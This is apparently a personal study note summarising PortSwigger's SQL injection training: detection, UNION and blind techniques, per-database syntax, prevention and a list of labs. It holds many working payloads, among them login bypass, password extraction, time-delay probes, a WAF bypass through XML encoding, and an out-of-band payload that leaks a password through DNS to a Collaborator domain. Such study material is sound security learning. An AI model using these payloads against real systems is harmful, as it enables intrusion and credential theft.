---
tags: [hacking, web, portswigger, sql-injection]
type: vulnerability-category
source: https://portswigger.net/web-security/sql-injection
last-verified: 2026-08-25
---

# SQL Injection

## Up
- [[PortSwigger]]

## What it is
SQL injection (SQLi) is a vulnerability that lets an attacker interfere with the queries an application makes to its database. Because user input is concatenated directly into a SQL statement instead of being treated as pure data, the attacker can change the logic or structure of the query — reading, modifying, or deleting data the application never intended to expose, and in some cases compromising the underlying server or causing denial of service.

## Impact
A successful attack can expose data the attacker shouldn't see (other users' credentials, credit-card details, personal data), bypass authentication or authorization, and modify or delete database contents. Real-world breaches have led to reputational damage, regulatory fines, and persistent backdoor access. It attacks the data layer directly, which is why it is consistently one of the most damaging web vulnerability classes.

## Detecting it
Test every entry point (URL params, form fields, cookies, headers, JSON/XML bodies) systematically and watch for behavioural differences:

- **Single quote `'`** — submit it and look for an error or any change in the response.
- **SQL syntax that evaluates to a base value** — compare the app's response to the original value vs. an injected equivalent.
- **Boolean conditions** — `OR 1=1` vs `OR 1=2`; a difference between the two responses indicates injection.
- **Time-delay payloads** — a payload that triggers a database sleep, detected by a measurable delay in the response.
- **OAST / out-of-band payloads** — a payload that triggers a DNS/HTTP interaction to a Burp Collaborator domain.

Burp Scanner can automate detection.

## Where it shows up
Injection isn't limited to `WHERE` clauses in a `SELECT`. It can appear in:

- `WHERE` clause of a `SELECT` (most common)
- `UPDATE` statements (in the updated values or the `WHERE` clause)
- `INSERT` statements (in the inserted values)
- Table or column names of a `SELECT`
- `ORDER BY` clauses

It also occurs outside plain query-string parameters — inside JSON or XML request bodies, or after custom encoding the app decodes server-side.

## Core techniques

### Retrieving hidden data
Modify the `WHERE` logic so the query returns rows it wasn't meant to. Example — a shopping app filters by category:

Original request:
```
https://insecure-website.com/products?category=Gifts
```
Original query:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Injecting `Gifts'--` comments out the rest of the query, dropping the `released = 1` restriction and exposing unreleased products:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
Injecting `Gifts'+OR+1=1--` returns every product because `1=1` is always true:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
> Caution: an `OR 1=1` that reaches an `UPDATE` or `DELETE` can cause accidental data loss.

### Subverting application logic (login bypass)
A login form runs:
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```
Submitting username `administrator'--` with any password comments out the password check, logging you in as administrator without knowing the password:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

### UNION attacks
When the query's results are returned in the response, `UNION SELECT` pulls data from *other* tables into that response. A `UNION` requires that (1) each query returns the **same number of columns**, and (2) the **data types are compatible** across corresponding columns.

**Step 1 — determine the number of columns.** Two methods:

- Incrementing `ORDER BY` until it errors:
  ```
  ' ORDER BY 1--
  ' ORDER BY 2--
  ' ORDER BY 3--   (error: "ORDER BY position number N is out of range")
  ```
- Incrementing `UNION SELECT NULL` until it succeeds:
  ```
  ' UNION SELECT NULL--
  ' UNION SELECT NULL,NULL--
  ' UNION SELECT NULL,NULL,NULL--
  ```
  `NULL` converts to every data type, maximising the chance the payload runs. The mismatch error is like: "All queries combined using a UNION … must have an equal number of expressions in their target lists."

**Step 2 — find a column with a useful (string) type.** Put a string literal in each position one at a time:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
An incompatible column errors: "Conversion failed when converting the varchar value 'a' to data type int."

**Step 3 — retrieve data** through the string-compatible column(s):
```
' UNION SELECT username, password FROM users--
```

**Step 4 — retrieve multiple values in a single column** by concatenating with a separator when only one usable column exists:
```
' UNION SELECT username || '~' || password FROM users--
```
yielding e.g. `administrator~s3cure`. Concatenation syntax is database-specific (see reference table below).

Database notes: Oracle requires a `FROM` clause, so use `FROM dual` — `' UNION SELECT NULL FROM DUAL--`. MySQL needs a space after `--`, or use `#` as the comment.

### Examining the database
Map the schema before extracting data.

**Version / type:**

| Database | Query |
|---|---|
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

e.g. `' UNION SELECT @@version--` → `Microsoft SQL Server 2016 …`.

**List tables (non-Oracle):**
```
SELECT * FROM information_schema.tables
```
returns `TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE` rows.

**List columns of a table (non-Oracle):**
```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
returns `... COLUMN_NAME | DATA_TYPE`.

**Oracle equivalents** (no `information_schema`):
```
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

### Blind SQL injection
Used when the response contains neither the query results nor database errors.

**Conditional responses.** A `TrackingId` cookie is used in:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
- `…xyz' AND '1'='1` → row returned → "Welcome back" appears.
- `…xyz' AND '1'='2` → no row → message absent.

Extract data character-by-character by testing each position:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

**Conditional errors.** When the app behaves identically whether or not a row is returned, force a database error only when a condition is true:
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a   -- no error
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   -- divide-by-zero error
```
Then make the condition a per-character comparison:
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

**Visible / verbose error messages.** Force a type-conversion error that echoes data, e.g. with `CAST()`:
```
CAST((SELECT example_column FROM example_table) AS int)
```
→ `ERROR: invalid input syntax for type integer: "Example data"`.

**Time delays.** When there is no in-band signal at all, infer true/false from response timing. Sleep syntax per database:

| Database | Delay syntax |
|---|---|
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |
| Oracle | `dbms_pipe.receive_message(('a'),10)` |

Unconditional to confirm the point, then conditional to extract data:
```
'; IF (1=1) WAITFOR DELAY '0:0:10'--
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

**Out-of-band (OAST).** When none of the above channels exist, trigger a DNS/HTTP lookup to a Collaborator domain (Microsoft example):
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
Exfiltrate data by embedding it in the subdomain:
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
→ DNS lookup `S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net` leaks the password. OAST works even when the injection is completely blind and asynchronous (second-order).

### Second-order SQL injection
Also called *stored* SQLi. Input is stored safely on one request (correctly escaped), then later read back and concatenated unsafely into a different query. The vulnerable code is at the point of *reuse*, not the point of entry, so it's easy to miss.

### Filter / WAF bypass via XML encoding
When input arrives in XML, entities can obfuscate SQL keywords so the payload slips past a filter/WAF that only pattern-matches raw keywords, because the app decodes the entities *after* the filter runs:
```xml
<stockCheck>
  <productId>123</productId>
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
Here `&#x53;` decodes to `S`, reconstructing `SELECT`. The Hackvertor extension can auto-encode a payload this way.

## Database-specific syntax reference

| | Oracle | Microsoft | PostgreSQL | MySQL |
|---|---|---|---|---|
| String concat | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` | `'a' 'b'` / `CONCAT('a','b')` |
| Substring | `SUBSTR(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` |
| Comment | `--` | `--` / `/*..*/` | `--` | `--`(+space) / `#` |
| DB version | `SELECT banner FROM v$version` | `@@version` | `version()` | `@@version` |
| Time delay | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:10'` | `pg_sleep(10)` | `SLEEP(10)` |
| Conditional | `SELECT CASE WHEN … END FROM dual` | `IF(cond, x, y)` | `SELECT CASE WHEN … END` | `IF(cond, x, y)` |

## Prevention
- Use **parameterized queries (prepared statements)** for all database access — never concatenate user input into SQL strings. Vulnerable:
  ```java
  String query = "SELECT * FROM products WHERE category = '"+ input +"'";
  ```
  Safe:
  ```java
  PreparedStatement statement = connection.prepareStatement(
      "SELECT * FROM products WHERE category = ?");
  statement.setString(1, input);
  ```
- Parameters can't be used for table/column names or `ORDER BY` — **allow-list** those against a fixed set of permitted values.
- The query template must always be a hard-coded constant; never build it from variable data, even data considered "trusted".
- Apply **least privilege** to the database account the app uses.
- Treat input validation/escaping as defense-in-depth only, not a substitute for parameterization.

## Labs
18 labs. "General approach" is the generic technique, not a verified per-lab walkthrough — fill in `Notes` yourself once solved.

### Retrieving hidden data

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | Apprentice | Append `' OR 1=1--` to the filtering parameter so `WHERE` always evaluates true, returning all rows. | |
| SQL injection vulnerability allowing login bypass | Apprentice | Username `administrator'--` to comment out the password check. | |

### UNION attacks

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| Determining the number of columns returned by the query | Practitioner | `ORDER BY n` incrementing until error, or `UNION SELECT NULL,...` until success. | |
| Finding a column containing text | Practitioner | `UNION SELECT` a string literal into each position to find one accepting strings. | |
| Retrieving data from other tables | Practitioner | `UNION SELECT username,password FROM users`. | |
| Retrieving multiple values in a single column | Practitioner | Concatenate with the DB's operator + separator, e.g. `username\|\|'~'\|\|password`. | |

### Examining the database

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| Querying the database type and version on Oracle | Practitioner | `UNION SELECT banner,NULL FROM v$version`. | |
| Querying the database type and version on MySQL and Microsoft | Practitioner | `UNION SELECT @@version,NULL--`. | |
| Listing the database contents on non-Oracle databases | Practitioner | `information_schema.tables` → `information_schema.columns` → UNION extract. | |
| Listing the database contents on Oracle | Practitioner | `all_tables` → `all_tab_columns` → UNION extract. | |

### Blind SQL injection

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| Blind SQL injection with conditional responses | Practitioner | Boolean condition in a cookie/param; infer true/false from a content difference; extract char-by-char. | |
| Blind SQL injection with conditional errors | Practitioner | `CASE WHEN (cond) THEN 1/0 ELSE 'a' END`; detect via HTTP 500. | |
| Visible error-based SQL injection | Practitioner | Force a `CAST()` error whose message leaks the value. | |
| Blind SQL injection with time delays | Practitioner | Unconditional `WAITFOR DELAY`/`SLEEP` to confirm via timing. | |
| Blind SQL injection with time delays and information retrieval | Practitioner | Conditional delay per-character comparison to extract data. | |
| Blind SQL injection with out-of-band interaction | Practitioner | Unconditional DNS lookup to a Collaborator domain to confirm the point. | |
| Blind SQL injection with out-of-band data exfiltration | Practitioner | Embed extracted data in the Collaborator subdomain. | |

### Filter bypass

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| SQL injection with filter bypass via XML encoding | Expert | Submit the payload as XML entities the app decodes after its filter runs. | |
